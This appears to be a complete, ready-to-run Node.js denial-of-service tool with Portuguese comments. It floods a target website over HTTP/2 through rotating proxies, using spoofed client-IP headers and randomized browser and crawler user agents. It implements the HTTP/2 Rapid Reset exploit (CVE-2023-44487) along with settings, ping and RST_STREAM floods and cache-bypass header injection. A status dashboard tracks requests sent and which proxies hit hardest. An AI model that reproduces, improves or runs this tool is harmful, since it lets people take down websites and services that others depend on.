const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const crypto = require("crypto");
const fs = require("fs");
const url = require("url");
const colors = require('colors');

// ==============================================
// CONFIGURAÇÕES ULTRA OTIMIZADAS
// ==============================================
const ATTACK_CONFIG = {
    MAX_RETRIES: 5,
    CONNECTION_TIMEOUT: 3000,
    INITIAL_WINDOW_SIZE: 4294967295,
    MAX_CONCURRENT_STREAMS: 15000,
    BATCH_SIZE: 100,
    RATE_INTERVAL: 10,
    SESSION_DURATION: 30000,
    PING_INTERVAL: 5000,
    ALL_ALPN: ['h3', 'h2', 'http/1.1', 'h1', 'spdy/3.1', 'http/2+quic/43', 'http/2+quic/44', 'http/2+quic/45'],
    CIPHERS: "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA256:AES256-SHA256:AES128-SHA:AES256-SHA:AES:CAMELLIA:DES-CBC3-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!aECDH:!EDH-DSS-DES-CBC3-SHA:!EDH-RSA-DES-CBC3-SHA:!KRB5-DES-CBC3-SHA"
};

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

// ==============================================
// PARSE ARGUMENTOS
// ==============================================
const args = {
    target: process.argv[2],
    time: ~~process.argv[3] || 60,
    Rate: ~~process.argv[4] || 100,
    threads: ~~process.argv[5] || 10,
    proxyFile: process.argv[6] || 'proxy.txt'
};

if (!args.target) {
    console.log(`
╔══════════════════════════════════════════════════════════════╗
║  Uso: node attack.js https://target.com 60 100 10 proxy.txt║
║                                                              ║
║  Parâmetros:                                                 ║
║    target  - URL do alvo                                    ║
║    time    - Duração em segundos                            ║
║    Rate    - Requests por batch                             ║
║    threads - Número de workers                             ║
║    proxyFile - Arquivo de proxies                          ║
╚══════════════════════════════════════════════════════════════╝
    `.rainbow);
    process.exit(1);
}

const parsedTarget = url.parse(args.target);
const proxies = fs.readFileSync(args.proxyFile, "utf-8").toString().split(/\r?\n/).filter(l => l.length > 5 && l.includes(':'));

console.log(`\n[+] Target: ${parsedTarget.host}`.green);
console.log(`[+] Proxies: ${proxies.length}`.cyan);
console.log(`[+] Threads: ${args.threads} | Rate: ${args.Rate} | Time: ${args.time}s`.cyan);

// ==============================================
// USER AGENTS ROTATIVOS
// ==============================================
const USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36'
];

// ==============================================
// FUNÇÕES AUXILIARES
// ==============================================
function randomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomElement(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

function randomPath() {
    const paths = ['/', '/api', '/v1', '/static', '/assets', '/images', '/css', '/js', '/wp-admin', '/login', '/auth', '/config', '/.env', '/backup', '/admin', '/cgi-bin', '/phpinfo.php', '/xmlrpc.php'];
    return randomElement(paths) + '?' + crypto.randomBytes(12).toString('hex') + '&cb=' + Date.now();
}

function randomHeaders(proxy) {
    const randomIP = `${randomInt(1,255)}.${randomInt(0,255)}.${randomInt(0,255)}.${randomInt(1,254)}`;
    
    return {
        ":method": randomElement(['GET', 'POST', 'HEAD']),
        ":path": randomPath(),
        ":scheme": "https",
        ":authority": parsedTarget.host,
        "user-agent": randomElement(USER_AGENTS),
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "accept-language": randomElement(['pt-BR,pt;q=0.9,en;q=0.8', 'en-US,en;q=0.9', 'es-ES,es;q=0.9']),
        "accept-encoding": "gzip, deflate, br, zstd",
        "cache-control": "no-cache, no-store, must-revalidate",
        "pragma": "no-cache",
        "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": randomElement(['"Windows"', '"macOS"', '"Linux"']),
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "none",
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1",
        "x-forwarded-for": randomIP,
        "x-real-ip": randomIP,
        "x-original-forwarded-for": randomIP,
        "cf-connecting-ip": randomIP,
        "dnt": "1"
    };
}

// ==============================================
// RAPID RESET EXPLOIT (CVE-2023-44487)
// ==============================================
function rapidResetAttack(client, count = 5000) {
    return new Promise((resolve) => {
        let created = 0;
        const streams = [];
        
        const create = () => {
            if (created >= count || client.destroyed) {
                streams.forEach(s => { try { s.close(0x08); } catch(e) {} });
                return resolve(created);
            }
            
            try {
                const stream = client.request({
                    ":method": "GET",
                    ":path": randomPath(),
                    ":scheme": "https",
                    ":authority": parsedTarget.host
                });
                streams.push(stream);
                created++;
                stream.close(0x08);
                setImmediate(create);
            } catch(e) {
                resolve(created);
            }
        };
        
        for(let i = 0; i < 100; i++) setImmediate(create);
    });
}

// ==============================================
// HEADER INJECTION ATTACK
// ==============================================
function headerInjectionAttack(client) {
    const injectionHeaders = {
        "x-forwarded-host": parsedTarget.host,
        "x-original-host": parsedTarget.host,
        "x-requested-with": "XMLHttpRequest",
        "x-http-method-override": randomElement(['PUT', 'DELETE', 'PATCH', 'OPTIONS']),
        "x-http-method": randomElement(['PUT', 'DELETE', 'PATCH']),
        "x-cache": "BYPASS",
        "x-cache-control": "BYPASS",
        "x-original-url": randomPath(),
        "x-rewrite-url": randomPath()
    };
    
    const headers = {
        ":method": "GET",
        ":path": randomPath(),
        ":scheme": "https",
        ":authority": parsedTarget.host,
        ...injectionHeaders
    };
    
    try {
        const req = client.request(headers);
        req.on('error', () => {});
        req.end();
    } catch(e) {}
}

// ==============================================
// HTTP/2 SETTINGS FLOOD
// ==============================================
function settingsFlood(client) {
    const settings = {
        headerTableSize: randomInt(4096, 65536),
        initialWindowSize: randomInt(65535, 4294967295),
        maxConcurrentStreams: randomInt(100, 15000),
        maxFrameSize: randomInt(16384, 16777215),
        maxHeaderListSize: randomInt(65536, 4294967295)
    };
    
    try {
        client.settings(settings);
    } catch(e) {}
}

// ==============================================
// PING FLOOD
// ==============================================
function pingFlood(client, count = 100) {
    for (let i = 0; i < count; i++) {
        try {
            client.ping((err, duration) => {});
        } catch(e) {}
    }
}

// ==============================================
// RST_STREAM FLOOD
// ==============================================
function rstStreamFlood(client, count = 100) {
    for (let i = 0; i < count; i++) {
        try {
            const stream = client.request({
                ":method": "GET",
                ":path": randomPath(),
                ":scheme": "https",
                ":authority": parsedTarget.host
            });
            stream.close(0x08);
        } catch(e) {}
    }
}

// ==============================================
// MASTER PROCESS
// ==============================================
if (cluster.isMaster) {
    let totalSent = 0, rps = 0, startTime = Date.now();
    const codes = {}, proxyHits = {};
    let activeWorkers = 0;

    for (let i = 0; i < args.threads; i++) {
        cluster.fork();
        activeWorkers++;
    }

    setInterval(() => {
        const elapsed = (Date.now() - startTime) / 1000;
        const avgRps = elapsed > 0 ? totalSent / elapsed : 0;
        
        console.clear();
        console.log('╔══════════════════════════════════════════════════════════════════════════════════════╗'.rainbow);
        console.log('║                     TLS-HTTPS ULTRA POWER MODE v3.0                                 ║'.rainbow);
        console.log('╠══════════════════════════════════════════════════════════════════════════════════════╣'.rainbow);
        console.log(`║ TARGET: ${parsedTarget.host.padEnd(55)}║`.cyan);
        console.log(`║ SENT: ${totalSent.toLocaleString().padEnd(20)} RPS: ${rps.toLocaleString().padEnd(15)} AVG: ${Math.round(avgRps).toLocaleString().padEnd(10)} ║`.green);
        console.log(`║ PROXIES: ${proxies.length} | WORKERS: ${activeWorkers} | RATE: ${args.Rate}           ║`.yellow);
        console.log('╠══════════════════════════════════════════════════════════════════════════════════════╣'.rainbow);
        
        const statusEntries = Object.entries(codes).sort((a,b) => b[1]-a[1]).slice(0, 6);
        const statusLine = statusEntries.map(([c,v]) => `${c}: ${v.toLocaleString()}`).join(' | ');
        console.log(`║ STATUS: ${(statusLine || 'PUSHING...').padEnd(55)}║`.white);
        console.log('╠══════════════════════════════════════════════════════════════════════════════════════╣'.rainbow);
        console.log(`║ TOP 5 PROXIES:`.white);
        
        Object.entries(proxyHits).sort((a,b) => b[1]-a[1]).slice(0, 5).forEach(([ip, count], idx) => {
            console.log(`║   ${(idx+1).toString().padEnd(3)} ${ip.padEnd(25)} ${count.toString().padStart(15)}${' '.repeat(18)}║`.yellow);
        });
        
        console.log('╚══════════════════════════════════════════════════════════════════════════════════════╝'.rainbow);
        
        rps = 0;
    }, 1000);

    cluster.on('message', (worker, msg) => {
        if (msg.type === 'batch') {
            totalSent += msg.c; 
            rps += msg.c;
            if (msg.ip) proxyHits[msg.ip] = (proxyHits[msg.ip] || 0) + msg.c;
            if (msg.codes) {
                for (let c in msg.codes) {
                    codes[c] = (codes[c] || 0) + msg.codes[c];
                }
            }
        }
    });
    
    setTimeout(() => {
        console.log(`\n[+] Ataque finalizado! Total: ${totalSent.toLocaleString()}`.green);
        process.exit(1);
    }, args.time * 1000);
    
    cluster.on('exit', (worker) => {
        activeWorkers--;
        cluster.fork();
        activeWorkers++;
    });
    
} else {
    // ==============================================
    // WORKER PROCESS
    // ==============================================
    const workerRate = Math.max(5, Math.floor(args.Rate / args.threads));
    let proxyIndex = 0;
    
    function getNextProxy() {
        if (proxies.length === 0) return null;
        const proxy = proxies[proxyIndex % proxies.length];
        proxyIndex++;
        return proxy;
    }
    
    function runFlooder() {
        const proxyAddr = getNextProxy();
        if (!proxyAddr) {
            setTimeout(runFlooder, 100);
            return;
        }
        
        const parsedProxy = proxyAddr.split(":");
        if (parsedProxy.length < 2) {
            setTimeout(runFlooder, 100);
            return;
        }
        
        let attempts = 0;
        let batchCount = 0;
        let batchCodes = {};
        
        const connectToProxy = () => {
            attempts++;
            if (attempts > 3) {
                setTimeout(runFlooder, 500);
                return;
            }
            
            const socket = net.connect({ 
                host: parsedProxy[0], 
                port: ~~parsedProxy[1],
                timeout: ATTACK_CONFIG.CONNECTION_TIMEOUT
            });
            socket.setNoDelay(true);

            socket.once("connect", () => {
                socket.write(`CONNECT ${parsedTarget.host}:443 HTTP/1.1\r\nHost: ${parsedTarget.host}:443\r\n\r\n`);
            });

            socket.once("data", (d) => {
                const response = d.toString();
                if (!response.includes("200") && !response.includes("Connection established")) {
                    socket.destroy();
                    setTimeout(connectToProxy, 1000);
                    return;
                }

                const tlsConn = tls.connect({
                    socket: socket,
                    servername: parsedTarget.host,
                    ALPNProtocols: ATTACK_CONFIG.ALL_ALPN,
                    rejectUnauthorized: false,
                    ciphers: ATTACK_CONFIG.CIPHERS,
                    minVersion: "TLSv1.2",
                    maxVersion: "TLSv1.3",
                    sessionTimeout: 30000,
                    requestOCSP: true
                }, () => {
                    const client = http2.connect(parsedTarget.href, {
                        protocol: "https:",
                        createConnection: () => tlsConn,
                        settings: {
                            maxConcurrentStreams: ATTACK_CONFIG.MAX_CONCURRENT_STREAMS,
                            initialWindowSize: ATTACK_CONFIG.INITIAL_WINDOW_SIZE,
                            enablePush: false,
                            headerTableSize: 65536,
                            maxHeaderListSize: 65536
                        }
                    });

                    client.on("connect", () => {
                        // === MÚLTIPLOS EXPLOITS ===
                        
                        // 1. Rapid Reset Attack
                        if (Math.random() > 0.7) {
                            rapidResetAttack(client, 2000);
                        }
                        
                        // 2. Settings Flood
                        if (Math.random() > 0.8) {
                            settingsFlood(client);
                        }
                        
                        // 3. Ping Flood
                        if (Math.random() > 0.9) {
                            pingFlood(client, 50);
                        }
                        
                        // 4. RST_STREAM Flood
                        if (Math.random() > 0.85) {
                            rstStreamFlood(client, 50);
                        }
                        
                        // 5. Header Injection
                        if (Math.random() > 0.75) {
                            headerInjectionAttack(client);
                        }
                        
                        const burst = setInterval(() => {
                            if (!client || client.destroyed) {
                                clearInterval(burst);
                                return;
                            }
                            
                            const headers = randomHeaders(parsedProxy[0]);
                            
                            for (let i = 0; i < workerRate; i++) {
                                const req = client.request(headers);
                                
                                req.on("response", (res) => {
                                    const sc = res[":status"];
                                    batchCodes[sc] = (batchCodes[sc] || 0) + 1;
                                    batchCount++;
                                    
                                    if (batchCount >= ATTACK_CONFIG.BATCH_SIZE) {
                                        process.send({ 
                                            type: 'batch', 
                                            c: batchCount, 
                                            codes: batchCodes, 
                                            ip: parsedProxy[0] 
                                        });
                                        batchCount = 0;
                                        batchCodes = {};
                                    }
                                    req.close();
                                    req.destroy();
                                });
                                
                                req.on('error', () => {
                                    req.close();
                                    req.destroy();
                                });
                                
                                req.end();
                            }
                        }, ATTACK_CONFIG.RATE_INTERVAL);
                        
                        // Ping para manter conexão viva
                        const pingInterval = setInterval(() => {
                            if (client && !client.destroyed) {
                                client.ping((err, duration) => {});
                            } else {
                                clearInterval(pingInterval);
                            }
                        }, ATTACK_CONFIG.PING_INTERVAL);
                        
                        setTimeout(() => {
                            clearInterval(burst);
                            clearInterval(pingInterval);
                            client.destroy();
                            socket.destroy();
                            setTimeout(runFlooder, 100);
                        }, ATTACK_CONFIG.SESSION_DURATION);
                    });
                    
                    client.on("error", () => {
                        socket.destroy();
                        setTimeout(connectToProxy, 500);
                    });
                    
                    client.on("goaway", () => {
                        client.destroy();
                        socket.destroy();
                        setTimeout(runFlooder, 250);
                    });
                });
                
                tlsConn.on('error', () => {
                    socket.destroy();
                    setTimeout(connectToProxy, 500);
                });
            });
            
            socket.on("error", () => {
                socket.destroy();
                setTimeout(connectToProxy, 300);
            });
            
            socket.on("timeout", () => {
                socket.destroy();
                setTimeout(connectToProxy, 300);
            });
        };
        
        connectToProxy();
    }
    
    // Múltiplos flooders por worker
    for (let i = 0; i < 4; i++) {
        setTimeout(runFlooder, i * 50);
    }
}
